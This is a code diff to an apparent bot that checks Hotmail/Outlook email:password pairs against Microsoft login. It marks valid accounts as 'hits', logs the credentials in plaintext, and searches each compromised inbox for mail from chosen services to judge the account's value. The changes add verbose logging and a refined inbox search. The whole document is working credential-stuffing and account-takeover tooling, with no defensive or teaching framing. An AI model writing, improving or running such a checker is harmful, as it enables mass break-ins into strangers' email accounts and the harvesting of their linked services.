@@ -353,52 +353,8 @@ def check_via_imap(email, password):
     """Backup method - not used with original method"""
     return None, "not_used"
 
-def check_emails_for_services(token, email, selected_services=None):
-    """Check inbox for service registrations"""
-    if not token or token == "valid_no_token":
-        return {}
-    
-    try:
-        headers = {
-            "Authorization": f"Bearer {token}",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        }
-        
-        # Get emails from inbox
-        response = requests.get(
-            "https://outlook.office.com/api/v2.0/me/messages?$top=100",
-            headers=headers,
-            timeout=20
-        )
-        
-        if response.status_code != 200:
-            return {}
-        
-        data = response.json()
-        found_services = {}
-        
-        # Check each service
-        services_to_check = selected_services if selected_services else services.keys()
-        
-        for service_name in services_to_check:
-            service_data = services[service_name]
-            sender_email = service_data["sender"]
-            
-            # Check if any email is from this service
-            for message in data.get("value", []):
-                sender = message.get("From", {}).get("EmailAddress", {}).get("Address", "")
-                if sender_email.lower() in sender.lower():
-                    found_services[service_name] = True
-                    break
-        
-        return found_services
-        
-    except Exception as e:
-        logger.error(f"Error checking emails: {e}")
-        return {}
-
 def check_account(email, password, user_id, selected_services=None):
-    """Check single account using original strong method"""
+    """Check single account using original strong method - ENHANCED"""
     result = {
         "email": email,
         "password": password,
@@ -411,27 +367,37 @@ def check_account(email, password, user_id, selected_services=None):
         # Get token using original method
         token_data, status = get_hotmail_token(email, password)
         
+        logger.info(f"Checking {email} - Status: {status}")
+        
         if status == "success" and token_data:
             result["status"] = "hit"
             result["message"] = "✅ Valid Account"
             
             # Log the hit
-            logger.info(f"HIT FOUND: {email}:{password}")
+            logger.info(f"✅ HIT FOUND: {email}:{password}")
             
             # Check for services if token available
             if token_data and isinstance(token_data, dict):
                 access_token = token_data.get("token")
                 cid = token_data.get("cid")
                 
-                if access_token:
+                logger.info(f"Got token for {email}, checking services...")
+                
+                if access_token and cid:
                     try:
                         services_found = check_emails_for_services_v2(access_token, cid, email, selected_services)
                         result["services"] = services_found
                         
+                        logger.info(f"Services found for {email}: {list(services_found.keys())}")
+                        
                         if services_found:
                             result["message"] += f" | 🎯 {len(services_found)} services"
+                        else:
+                            logger.warning(f"No services found for {email}")
                     except Exception as e:
-                        logger.error(f"Error checking services: {e}")
+                        logger.error(f"Error checking services for {email}: {e}")
+                else:
+                    logger.warning(f"No token/cid for {email}")
             
             # Update stats
             user_manager.update_stats(user_id, hits=1, checks=1)
@@ -439,34 +405,41 @@ def check_account(email, password, user_id, selected_services=None):
         elif status == "locked":
             result["status"] = "locked"
             result["message"] = "🔒 Account Locked"
+            logger.info(f"🔒 LOCKED: {email}")
             user_manager.update_stats(user_id, checks=1)
             
         elif status == "timeout":
             result["status"] = "retry"
             result["message"] = "⏱️ Timeout"
+            logger.warning(f"⏱️ TIMEOUT: {email}")
             
         elif status == "connection_error":
             result["status"] = "retry"
             result["message"] = "🔌 Connection Error"
+            logger.warning(f"🔌 CONNECTION ERROR: {email}")
             
         elif status == "parse_error":
             result["status"] = "retry"
             result["message"] = "🔄 Parse Error - Retry"
+            logger.warning(f"🔄 PARSE ERROR: {email}")
             
         else:
             result["status"] = "bad"
             result["message"] = "❌ Invalid"
+            logger.info(f"❌ BAD: {email}")
             user_manager.update_stats(user_id, checks=1)
     
     except Exception as e:
-        logger.error(f"Error checking {email}: {e}")
+        logger.error(f"❌ Error checking {email}: {e}")
+        import traceback
+        logger.error(traceback.format_exc())
         result["status"] = "error"
-        result["message"] = f"❌ Error: {str(e)}"
+        result["message"] = f"❌ Error"
     
     return result
 
 def check_emails_for_services_v2(access_token, cid, email, selected_services=None):
-    """Check for services using original search method"""
+    """Check for services using Outlook Search API - FIXED"""
     try:
         search_url = "https://outlook.live.com/search/api/v2/query"
         
@@ -477,6 +450,7 @@ def check_emails_for_services_v2(access_token, cid, email, selected_services=Non
         for service_name, service_info in services_to_check.items():
             sender = service_info["sender"]
             
+            # Search payload
             payload = {
                 "Cvid": str(uuid.uuid4()),
                 "Scenario": {"Name": "owa.react"},
@@ -506,19 +480,26 @@ def check_emails_for_services_v2(access_token, cid, email, selected_services=Non
                 
                 if response.status_code == 200:
                     data = response.json()
+                    
+                    # Check if results exist
                     if data.get("EntitySets") and len(data["EntitySets"]) > 0:
                         entities = data["EntitySets"][0].get("ResultSet", {}).get("Entities", [])
                         if len(entities) > 0:
                             found_services[service_name] = True
+                            logger.info(f"Service found: {service_name} for {email}")
                 
-                time.sleep(0.1)
-            except:
+                # Small delay between searches
+                time.sleep(0.05)
+                
+            except Exception as e:
+                logger.error(f"Error searching {service_name}: {e}")
                 continue
         
+        logger.info(f"Total services found for {email}: {len(found_services)}")
         return found_services
         
     except Exception as e:
-        logger.error(f"Error in service check: {e}")
+        logger.error(f"Error in check_emails_for_services_v2: {e}")
         return {}
 
 # ==================== BOT HANDLERS ====================
